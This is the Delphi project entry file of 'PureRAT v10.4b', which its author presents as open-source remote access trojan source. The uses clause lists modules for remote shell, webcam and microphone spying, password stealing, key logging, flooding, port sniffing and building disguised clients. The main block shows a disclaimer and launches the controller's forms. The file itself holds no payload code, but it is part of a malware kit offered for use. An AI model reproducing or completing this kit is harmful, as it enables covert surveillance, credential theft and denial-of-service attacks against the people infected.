{
  PureRAT v10.4b OPEN SOURCE by wrh1d3

  The source code is not well commented and i'm sorry for that.
  Otherwise if you want more explanations or if you want add me to a project,
  just contact me on [wrh1d3@gmail.com] or [wrh1d3@xmpp.jp].
  
  Thanks.
}
program PureRAT;

uses
  Windows,
  Classes,
  SysUtils,
  Forms,
  Controls,
  UnitMain in 'UnitMain.pas' {FormMain},
  UnitSelectPort in 'UnitSelectPort.pas' {FormSelectPort},
  UnitTasksManager in 'UnitTasksManager.pas' {FormTasksManager},
  UnitInformations in 'UnitInformations.pas' {FormInformations},
  UnitFilesManager in 'UnitFilesManager.pas' {FormFilesManager},
  UnitRegistryManager in 'UnitRegistryManager.pas' {FormRegistryManager},
  UnitShell in 'UnitShell.pas' {FormShell},
  UnitDesktop in 'UnitDesktop.pas' {FormDesktop},
  UnitWebcam in 'UnitWebcam.pas' {FormWebcam},
  UnitMicrophone in 'UnitMicrophone.pas' {FormMicrophone},
  UnitPasswords in 'UnitPasswords.pas' {FormPasswords},
  UnitLogger in 'UnitLogger.pas' {FormLogger},
  UnitMessagesBox in 'UnitMessagesBox.pas' {FormMessagesBox},
  UnitScripts in 'UnitScripts.pas' {FormScripts},
  UnitPortScanner in 'UnitPortScanner.pas' {FormPortScanner},
  UnitPortSniffer in 'UnitPortSniffer.pas' {FormPortSniffer},
  UnitFlooder in 'UnitFlooder.pas' {FormFlooder},
  UnitFun in 'UnitFun.pas' {FormFun},
  UnitChat in 'UnitChat.pas' {FormChat},
  UnitEditFile in 'UnitEditFile.pas' {FormEditFile},
  UnitCommands in '..\Global units\UnitCommands.pas',
  UnitConstants in '..\Global units\UnitConstants.pas',
  SocketUnitEx in 'Units\SocketUnitEx.pas',
  UnitFunctions in 'Units\UnitFunctions.pas',
  UnitVariables in 'Units\UnitVariables.pas',
  UnitEncryption in '..\Global units\UnitEncryption.pas',
  UnitNotification in 'UnitNotification.pas' {FormNotification},
  GeoIP in 'Units\GeoIP.pas',
  UnitCountry in 'Units\UnitCountry.pas',
  UnitRepository in 'Units\UnitRepository.pas',
  BTMemoryModule in '..\Global units\BTMemoryModule.pas',
  UnitProcessModules in 'UnitProcessModules.pas' {FormProcessModules},
  UnitEditService in 'UnitEditService.pas' {FormEditService},
  ListarDispositivos in 'Units\ListarDispositivos.pas',
  Common in '..\Global units\Common.pas',
  DeviceHelper in '..\Global units\DeviceHelper.pas',
  ModuleLoader in '..\Global units\ModuleLoader.pas',
  SetupApi in '..\Global units\SetupApi.pas',
  ZLibEx in 'Units\ZLibEx\ZLibEx.pas',
  UnitFtpManager in 'UnitFtpManager.pas' {FormFTPManager},
  UnitRegistryEditor in 'UnitRegistryEditor.pas' {FormRegistryEditor},
  UnitBuilder in 'UnitBuilder.pas' {FormBuilder},
  UnitIconChanger in 'Units\UnitIconChanger.pas',
  uftp in '..\Global units\uftp.pas',
  UnitDisclamer in 'UnitDisclamer.pas' {FormDisclamer},
  UnitDnsUpdater in 'UnitDnsUpdater.pas' {FormDnsUpdater},
  Base64 in '..\Global units\Base64.pas',
  UnitManager in 'UnitManager.pas' {FormManager},
  UnitRecords in 'UnitRecords.pas' {FormRecords},
  UnitAbout in 'UnitAbout.pas' {FormAbout},
  uJSONConfig in 'Units\uJSONConfig.pas',
  ACMConvertor in 'Units\ACM\ACMConvertor.pas',
  ACMIn in 'Units\ACM\ACMIn.pas',
  ACMOut in 'Units\ACM\ACMOut.pas',
  ListUnit in 'Units\ACM\ListUnit.pas',
  MSAcm in 'Units\ACM\MSACM.pas',
  UnitPluginsBuilder in 'UnitPluginsBuilder.pas' {FormPluginsBuilder},
  UnitHardware in 'Units\UnitHardware.pas',
  UnitClientEdit in 'UnitClientEdit.pas' {FormClientEdit},
  UnitMultiDesktop in 'UnitMultiDesktop.pas' {FormMultiDesktop},
  UnitMultiWebcam in 'UnitMultiWebcam.pas' {FormMultiWebcam},
  uDep in '..\Global units\uDEP.pas',
  ClassesMOD in 'Units\ClassesMOD.pas',
  UnitImagePreview in 'UnitImagePreview.pas' {FormImagePreview},
  UnitDB in 'Units\UnitDB.pas',
  UnitSystem in 'UnitSystem.pas' {FormSystem},
  UnitAttributes in 'UnitAttributes.pas' {FormAttributes},
  UnitNotes in 'UnitNotes.pas' {FormNotes},
  UnitPluginsManager in 'UnitPluginsManager.pas' {FormPluginsManager},
  UnitClientsTasks in 'UnitClientsTasks.pas' {FormClientsTasks},
  UnitTasks in 'UnitTasks.pas' {FormTasks},
  UnitSplash in 'UnitSplash.pas' {FormSplash},
  UnitSettings in 'UnitSettings.pas' {FormSettings},
  md5 in 'Units\MD5.pas';

{$R *.res}
{$R ..\Resources\Resources.RES}
{$R ..\Resources\Sounds.RES} //Some wav sounds comes from Dark Comet 5.3.1

var
  TmpStr: string;             
begin
  CreateMutex(nil, False, PChar(PROGRAMINFOS));
  if GetLastError = ERROR_ALREADY_EXISTS then ExitProcess(0);
                   
  if ReadKeyString(HKEY_CURRENT_USER, 'Software\PureRAT', 'Disclaimer', '') <> 'Agree' then
  begin
    FormDisclamer := TFormDisclamer.Create(nil);
    if FormDisclamer.ShowModal <> IDOK then ExitProcess(0);
    if FormDisclamer.chk1.Checked then
    CreateKeyString(HKEY_CURRENT_USER, 'Software\PureRAT', 'Disclaimer', 'Agree');
    FormDisclamer.Release;
    FormDisclamer := nil;
  end;

  //Show splash screen
  FormSplash := TFormSplash.Create(nil);
  FormSplash.Show;
  FormSplash.Cursor := crHourGlass;
  Application.ProcessMessages;
                                                  
  Application.Initialize;
  Application.ShowMainForm := False;
  Application.Title := 'PureRAT';
  Application.CreateForm(TFormMain, FormMain);
  Application.CreateForm(TFormDnsUpdater, FormDnsUpdater);
  Application.CreateForm(TFormAbout, FormAbout);
  Application.CreateForm(TFormMultiDesktop, FormMultiDesktop);
  Application.CreateForm(TFormMultiWebcam, FormMultiWebcam);
  Application.CreateForm(TFormPluginsManager, FormPluginsManager);
  Application.CreateForm(TFormClientsTasks, FormClientsTasks);
  Application.CreateForm(TFormFlooder, FormFlooder);
  Application.CreateForm(TFormSelectPort, FormSelectPort);
  
  FormMain.Show;
  FormSplash.Free;
  Application.Run;
end.
